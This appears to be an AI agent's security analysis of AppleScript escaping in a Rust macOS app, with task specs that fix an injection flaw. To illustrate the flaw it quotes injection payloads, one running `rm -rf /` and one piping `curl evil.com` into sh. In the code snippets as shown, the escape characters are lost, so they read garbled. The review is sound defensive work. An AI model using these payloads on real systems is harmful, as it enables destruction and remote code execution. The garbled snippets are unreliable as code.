Still running. Given the Chrome limit, let me generate the swarm tasks myself based on my thorough analysis of the code. I have all the context I need.

Based on my analysis, here are the findings and swarm tasks:

---

## Analysis Summary

There are **three separate AppleScript escape implementations** with **inconsistent coverage**:

| Function | Location | Escapes | Used for |
|---|---|---|---|
| `escape_applescript_string` | `utils/applescript.rs:7` | `\`, `"` only | file paths (5 call sites) |
| `applescript_escape` | `builtin_execution.rs:26` | `\`, `"`, `
`, ``, `	` | UI dialogs, quicklinks |
| inline `.replace()` | `executor/scriptlet.rs:794` | `\`, `"` only | **arbitrary user scriptlet content** |

The critical issue: `execute_type()` at line 794 takes user-authored scriptlet content and interpolates it into an AppleScript string with only backslash/quote escaping. A scriptlet value containing `
` followed by AppleScript commands (e.g., `hello
" & return & "do shell script \"rm -rf /\""`) can break out of the string and execute arbitrary AppleScript.

---

## SWARM TASK LIST

### Task 1: `unify-applescript-escape`

**Scope:** `src/utils/applescript.rs`

**Task:**
The file `src/utils/applescript.rs` contains `escape_applescript_string()` which only escapes backslash and double-quote. This is insufficient — AppleScript interprets `
`, ``, and `	` as control characters inside double-quoted strings. A path or value containing a literal newline character will terminate the string and allow injection of arbitrary AppleScript commands. The fix must add escaping for `
`, ``, and `	` to match the more complete implementation in `src/app_execute/builtin_execution.rs:26`.

Current code at `src/utils/applescript.rs:7-9`:
```rust
pub fn escape_applescript_string(input: &str) -> String {
    input.replace('\', "\\").replace('"', "\\"")
}
```

Replace with:
```rust
pub fn escape_applescript_string(input: &str) -> String {
    input
        .replace('\', "\\")
        .replace('"', "\\"")
        .replace('
', "\n")
        .replace('', "\r")
        .replace('	', "\t")
}
```

Order matters: backslash MUST be escaped first, or the backslashes added by later replacements will themselves be double-escaped. Update the existing tests to also cover newline, carriage return, and tab escaping. Add a test like:
```rust
#[test]
fn test_escape_applescript_string_escapes_control_chars() {
    let input = "line1
line2line3	tab";
    let escaped = escape_applescript_string(input);
    assert_eq!(escaped, "line1\nline2\rline3\ttab");
}
```
Do not change any other files. The 5 existing call sites (`app_actions/helpers.rs`, `file_search/mod.rs` ×4) will automatically get the stronger escaping.

### Task 2: `fix-execute-type-escape`

**Scope:** `src/executor/scriptlet.rs`

**Task:**
In `src/executor/scriptlet.rs`, the function `execute_type()` (line 786-809, `#[cfg(target_os = "macos")]`) builds an AppleScript string by doing inline `.replace('\', "\\").replace('"', "\\"")` at line 794. This misses newline/carriage-return/tab characters, allowing a scriptlet's `type:` value to inject arbitrary AppleScript. For example, a value like `hello
" 
 tell application "Terminal" to do script "curl evil.com | sh"` would break out of the keystroke string and execute a shell command.

Current code at lines 791-795:
```rust
    let script = format!(
        r#"tell application "System Events" to keystroke "{}""#,
        text.replace('\', "\\").replace('"', "\\"")
    );
```

Replace with:
```rust
    let script = format!(
        r#"tell application "System Events" to keystroke "{}""#,
        crate::utils::escape_applescript_string(text)
    );
```

This delegates to the canonical `escape_applescript_string` from `src/utils/applescript.rs` (which Task 1 is strengthening to also escape `
`, ``, `	`). Add `use crate::utils::escape_applescript_string;` at the top of the file if not already imported, or use the fully qualified path as shown. Verify there is no existing import by searching for `use crate::utils` in the file. The function `execute_type` is `#[cfg(target_os = "macos")]` so this only applies on macOS. Do not change the `#[cfg(not(target_os = "macos"))]` variant. Do not change `execute_paste` or `execute_submit`.

### Task 3: `dedupe-builtin-applescript-escape`

**Scope:** `src/app_execute/builtin_execution.rs`

**Task:**
The file `src/app_execute/builtin_execution.rs` has its own private `applescript_escape()` function at line 26-32 that duplicates the functionality of `crate::utils::escape_applescript_string()`. After Task 1 strengthens the canonical version, this duplicate should be removed and all call sites within `builtin_execution.rs` should use the canonical utility instead.

Current code at lines 26-32:
```rust
#[cfg(target_os = "macos")]
fn applescript_escape(text: &str) -> String {
    text.replace('\', "\\")
        .replace('"', "\\"")
        .replace('
', "\n")
        .replace('', "\r")
        .replace('	', "\t")
}
```

Delete this function entirely. Then find-and-replace all occurrences of `applescript_escape(` in this file with `crate::utils::escape_applescript_string(`. The call sites are at lines: 38 (`applescript_list_literal`), 83-84 (`choose_from_list`), 104-106 (`display_dialog`/`get_text_input`), 125-126 (quicklinks formatting). Each of these is inside a `#[cfg(target_os = "macos")]` block, which is fine because `escape_applescript_string` is not cfg-gated (it's pure string manipulation).

Also update the `applescript_list_literal` function at line 35-42 which calls `applescript_escape` — change it to use `crate::utils::escape_applescript_string`. Verify the build compiles with `cargo check`. Do not change any logic, only the import path. Do not add any new functions or modules.

---

NEXT_AREA: `selected_text::set_selected_text()` used by `execute_paste()` — investigate whether it sanitizes clipboard content before simulating Cmd+V, and whether the clipboard set + keystroke pattern has TOCTOU race conditions exploitable by concurrent processes
